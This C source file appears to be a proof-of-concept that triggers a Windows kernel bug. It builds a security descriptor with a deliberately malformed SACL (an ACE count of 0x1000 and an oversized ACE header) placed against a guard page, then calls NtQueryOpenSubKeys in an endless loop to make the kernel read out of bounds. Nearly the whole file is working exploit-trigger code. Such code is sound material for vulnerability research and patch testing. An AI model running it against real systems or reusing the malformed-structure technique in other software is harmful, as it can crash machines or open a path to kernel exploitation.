#ifndef WIN32_NO_STATUS
# define WIN32_NO_STATUS    // I prefer working with ntstatus.h
#endif
#include <windows.h>
#include <assert.h>
#include <stdio.h>
#include <winerror.h>
#include <winternl.h>
#include <stddef.h>
#include <winnt.h>
#ifdef WIN32_NO_STATUS
# undef WIN32_NO_STATUS
#endif
#include <ntstatus.h>
 
#pragma comment(lib, "advapi32")
 
PVOID AllocBuffer(ULONG Size);
 
// macro below copied from ntdef.h
 
#define InitializeObjectAttributes( p, n, a, r, s ) {   \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }
 
#define OBJ_FORCE_ACCESS_CHECK  0x00000400L
 
int main(int argc, char **argv)
{
    OBJECT_ATTRIBUTES ObjectAttributes;
    SECURITY_DESCRIPTOR SecurityDescriptor;
    UNICODE_STRING ObjectName;
    FARPROC NtQueryOpenSubKeys;
    ULONG HandleCount;
    PACL Sacl;
    ACE_HEADER Ace;
 
    NtQueryOpenSubKeys = GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtQueryOpenSubKeys");
 
    InitializeObjectAttributes(&ObjectAttributes,
                               &ObjectName,
                               OBJ_FORCE_ACCESS_CHECK,
                               NULL,
                               &SecurityDescriptor);
 
    fprintf(stderr, "NtQueryOpenSubKeys@%p\n", NtQueryOpenSubKeys);
 
    ZeroMemory(&ObjectName, sizeof(ObjectName));
 
    Sacl            = AllocBuffer(0x800);
    Ace.AceType     = SYSTEM_MANDATORY_LABEL_ACE_TYPE;
    Ace.AceFlags    = INHERIT_ONLY_ACE;
 
    InitializeSecurityDescriptor(&SecurityDescriptor, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorSacl(&SecurityDescriptor, TRUE, Sacl, FALSE);
    InitializeAcl(Sacl, 0x800, ACL_REVISION);
 
    // Begin malformed
    Sacl->AceCount   = 0x1000;
    Ace.AceSize      = 0x1000;
 
    // Append ACE Header (body not necessary to demonstrate bug)
    // &Sacl[1] is the first byte after the ACL, where the first ACE begins.
    CopyMemory(&Sacl[1], &Ace, sizeof(Ace));
 
    while (TRUE) {
        NtQueryOpenSubKeys(&ObjectAttributes, &HandleCount);
        Sleep(0x1);
    }
 
    return 0;
}
 
#ifndef PAGE_SIZE
# define PAGE_SIZE 0x1000
#endif
 
// Quick routine to make a guarded buffer, no error checking etc. whatever.
PVOID AllocBuffer(ULONG Size)
{
    ULONG GuardBufSize;
    PBYTE GuardBuf;
    ULONG ProtBits;
 
    // Round size up to the next PAGE_SIZE
    GuardBufSize = (Size + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
 
    // Add one page to be a guardbuf
    GuardBufSize = GuardBufSize + PAGE_SIZE;
 
    // Allocate a buffer with a GuardPage
    GuardBuf = VirtualAlloc(NULL,
                            GuardBufSize,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE);
 
    // Make the last page NOACCESS
    VirtualProtect(GuardBuf + GuardBufSize - PAGE_SIZE,
                   PAGE_SIZE,
                   PAGE_NOACCESS,
                   &ProtBits);
 
    // Calculate where buffer should be, so that Buffer[Size] AVs.
    return GuardBuf + GuardBufSize - PAGE_SIZE - Size;
}